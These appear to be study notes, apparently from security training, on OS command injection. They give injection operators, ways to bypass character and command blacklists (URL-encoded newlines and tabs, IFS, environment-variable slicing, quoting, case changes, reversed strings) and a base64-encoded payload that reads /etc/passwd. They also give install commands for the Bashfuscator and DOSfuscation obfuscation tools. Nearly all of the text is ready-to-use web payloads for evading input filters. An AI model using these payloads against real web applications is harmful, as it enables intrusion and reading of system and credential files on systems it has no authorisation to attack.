![[Pasted image 20250415174021.png]]
![[Pasted image 20250415174756.png]]

**AND (&&) Operator** - `ping -c 1 127.0.0.1 && whoami` : This will execute both the commands.
**OR (||) Operator** - `ping -c 1 127.0.0.1 || whoami` : This runs second command only if the first commands fail to execute
![[Pasted image 20250416101227.png]]

**Check for Blacklisted Characters :**  A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. 

## Bypassing Blacklisted Characters
- Spaces - `127.0.0.1%0awhoami
- Use Tabs - `127.0.0.1%0a%09`
- Use IFS - `127.0.0.1%0a${IFS}`
- Using Brace Expansions - `127.0.0.1%0a{ls,-la}`
- `LINUX` If `/` is blacklisted then we can use something like - `${PATH:0:1}`, this prints the same output
-  `LINUX` If `;` is blacklisted then we can use something like - `${LS_COLORS:10:1}`
- `WINDOWS` If `/` is blacklisted then we can use something like - `echo %HOMEPATH:~6,-11%`

## Bypassing Blacklisted Commands
- If a command like `whoami` is blacklisted, then for `BASH` or `POWERSHELL` we can use - `w'h'o'am'i`
- If a command like `whoami` is blacklisted and it's confirmed that it is `LINUX BASH`, then we can use- `who$@ami`  or  `w\ho\am\i`
- If a command like `whoami` is blacklisted and it's confirmed that it is `WINDOWS`, then we can use - `who^ami`
- We can use Case Manipulation - `WhOaMi`
- `$(a="WhOaMi";printf %s "${a,,}")`
- `LINUX` Reversed Command - `$(rev<<<'imaohw')`
- `POWERSHELL` Reversed Command - `iex "$('imaohw'[-1..-20] -join '')"`
- Encode the Command using - `echo -n 'cat /etc/passwd | grep 33' | base64` and then use the payload as : `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`

## Bashfuscator (Linux)
Installing / Downloading the tool :
```shell-session
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

To obfuscate the command : `./bashfuscator -c 'cat /etc/passwd'` or `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`

## DOSfuscation
```powershell-session
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
```

